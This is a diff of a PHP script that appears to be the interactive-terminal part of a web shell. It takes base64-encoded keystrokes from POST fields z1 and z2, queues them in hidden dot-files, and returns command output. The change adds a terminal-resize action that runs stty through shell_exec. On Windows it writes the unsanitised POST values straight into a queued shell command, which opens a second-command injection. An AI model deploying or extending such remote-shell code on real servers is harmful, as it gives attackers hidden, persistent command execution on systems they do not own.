@@ -7,8 +7,8 @@
 
 $work_dir = getcwd();
 $queue_dir = $work_dir . '/.queue';
-$out_file = $work_dir . '/.output.txt';  
-$pid_file = $work_dir . '/.pid.txt';     
+$out_file = $work_dir . '/.output.txt';
+$pid_file = $work_dir . '/.pid.txt';
 
 // Ensure queue directory exists cleanly
 if (!file_exists($queue_dir)) {
@@ -167,6 +167,20 @@ if ($type == "create") {
             @ftruncate($error, 0);
         }
 
+        // resize
+        $resize_file = $work_dir . '/.resize.txt';
+        if (file_exists($resize_file)) {
+            $resize = explode(':', @file_get_contents($resize_file));
+            @unlink($resize_file);
+
+            if (count($resize) == 2) {
+                $rows = (int)$resize[0];
+                $cols = (int)$resize[1];
+
+                @shell_exec("stty rows $rows cols $cols 2>/dev/null");
+            }
+        }
+
         $status = proc_get_status($process);
         if (!$status['running']) {
             break;
@@ -189,13 +203,13 @@ if ($type == "create") {
     }
 } 
 
-elseif ($type == "write") {
+else if ($type == "write") {
     $rawBytes = base64_decode($z1, true);
     if ($rawBytes === false) {
         $rawBytes = $z1; 
     }
 
-    // FIX: Write keystrokes to completely unique isolated file chunks.
+    // Write keystrokes to completely unique isolated file chunks.
     // High-resolution microtime ensures perfect chronologically sorted filenames.
     $chunk_file = $queue_dir . '/' . sprintf("%015.4f", microtime(true)) . '_' . rand(1000, 9999) . '.txt';
     file_put_contents($chunk_file, $rawBytes, LOCK_EX);
@@ -205,7 +219,7 @@ elseif ($type == "write") {
     echo json_encode($result);
 } 
 
-elseif ($type == "read") {
+else if ($type == "read") {
     $readContent = '';
     clearstatcache(true, $out_file);
     
@@ -223,9 +237,37 @@ elseif ($type == "read") {
     $result["status"] = "success";
     $result["msg"] = base64_encode($readContent);
     echo json_encode($result);
-} 
+}
 
-elseif ($type == "stop") {
+else if ($type == "resize") {
+    $cols = base64_decode($_POST['z1']);
+    $rows = base64_decode($_POST['z2']);
+
+    if ($cols <= 0 || $rows <= 0) {
+        $result['status'] = 'error';
+        $result['msg'] = base64_encode('Invalid dimensions.');
+
+        echo json_encode($result);
+
+        exit;
+    }
+
+    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
+    if ($win) {
+        $cmd = "mode con: cols=$cols lines=$rows && cls\r\n";
+        $chunk_file = $queue_dir . '/' . sprintf("%015.4f", microtime(true)) . '_' . rand(1000, 9999) . '.txt';
+        file_put_contents($chunk_file, $cmd, LOCK_EX);
+    } else {
+        file_put_contents($work_dir . '/.resize.txt', "$rows:$cols");
+    }
+
+    $result['status'] = 'success';
+    $result['msg'] = base64_encode('Dimensions are updated');
+
+    echo json_encode($result);
+}
+
+else if ($type == "stop") {
     file_put_contents($pid_file, 'stopped');
     $result["status"] = "stop";
     $result["msg"] = base64_encode("Engine shutdown initiated.");
